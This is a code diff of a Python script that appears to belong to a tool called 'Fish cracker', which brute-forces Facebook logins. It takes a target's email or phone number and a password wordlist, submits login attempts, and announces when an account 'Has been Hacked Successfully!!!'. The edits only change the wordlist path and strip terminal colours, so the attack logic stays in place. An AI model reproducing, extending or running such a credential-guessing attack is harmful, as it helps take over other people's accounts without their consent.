@@ -24,7 +24,7 @@ print
 
 #email
 email = str(raw_input("\n\nEmail or Phone: "))
-wp = 'wordlist/pass.txt'
+wp = 'wordlist.txt'
 #wordlist
 passwordlist = str(raw_input("Wordlist Path : or (enter if its already) ")) + wp
 
@@ -49,7 +49,7 @@ def main():
 	print("Password does not exist in the wordlist")
 	print ("\n\n\n\n   launch = launch the facebook bruteforce attack again")
 	print ("   quit = return in Fish cracker main menu")
-	t = raw_input(Fore.CYAN + "\n\n Select your choice " + Fore.RESET)
+	t = raw_input("\n\n Select your choice " )
 	if t == "launch":
                 os.system("fb.py")
         elif t == "quit":
@@ -72,8 +72,8 @@ def brute(password):
 	sub = br.submit()
 	log = sub.geturl()
 	if log != login and (not 'login_attempt' in log):
-			print("\n[+] Email/Phone: " + email + " Password: {}".format(password) + Fore.RESET)
-			print("[+] " + email + " Has been Hacked Successfully!!!" + Fore.RESET) 
+			print("\n[+] Email/Phone: " + email + " Password: {}".format(password))
+			print("[+] " + email + " Has been Hacked Successfully!!!") 
 			m = raw_input('\n\n\n Do You want to exit? [Y/n]: ')
 			if m == 'y':
 				exit()
